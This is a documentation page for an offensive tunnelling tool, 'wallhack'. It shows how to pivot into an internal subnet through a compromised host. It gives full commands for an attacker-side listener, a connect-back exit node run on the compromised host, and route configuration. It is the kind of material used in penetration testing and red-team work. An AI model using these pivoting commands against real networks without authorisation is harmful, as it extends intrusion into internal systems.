---
title: Single Hop Example
description: Establish a direct tunnel between an entry node and a single compromised host.
order: 7
---

# Single Hop Example

In this example, an entry node runs on the attacker machine (`192.168.1.5`) and a compromised host (`10.0.1.5`) connects back to it. Once established, traffic to `10.10.0.0/24` routes through the compromised host.

The binary reached the host via initial access — a web shell, RCE exploit, or similar foothold. Once transferred and marked executable, the exit node can be started.

{% trafficflow flow="192.168.1.5 (entry) -> 10.0.1.5 (compromised) -> 10.10.0.0/24 (target)" label="Traffic Flow:" /%}

{% steps %}
{% step title="Attacker (192.168.1.5)" number=1 %}
An [entry node](/concepts) listening for incoming connections. The default transport is QUIC (UDP).

{% codeblock code="wallhack entry --listen :4444" /%}
{% /step %}

{% step title="Compromised Host (10.0.1.5)" number=2 %}
An [exit node](/concepts) connecting back to the entry node. `--exit-id` assigns a name to this peer — you'll reference it when adding routes from the entry node REPL. It can be any identifier you choose.

{% codeblock code="wallhack exit --connect 192.168.1.5:4444 --exit-id peer1" /%}

If `--exit-id` is omitted, a random identifier is generated — run `peers` in the REPL to discover it.

{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for the networks accessible through the compromised host. Use the wallhack REPL **or** the system `ip` tool — pick one.

{% grid cols=2 %}
{% card title="wallhack REPL" icon="repl" description="Run on the entry node. The REPL also configures the OS route automatically." %}
```
wallhack> route add 10.10.0.0/24 via peer1
```
{% /card %}
{% card title="System ip tool" icon="terminal" description="Run on the attacker machine." %}
```bash
ip route add 10.10.0.0/24 dev tun0
```
{% /card %}
{% /grid %}
{% /step %}
{% /steps %}
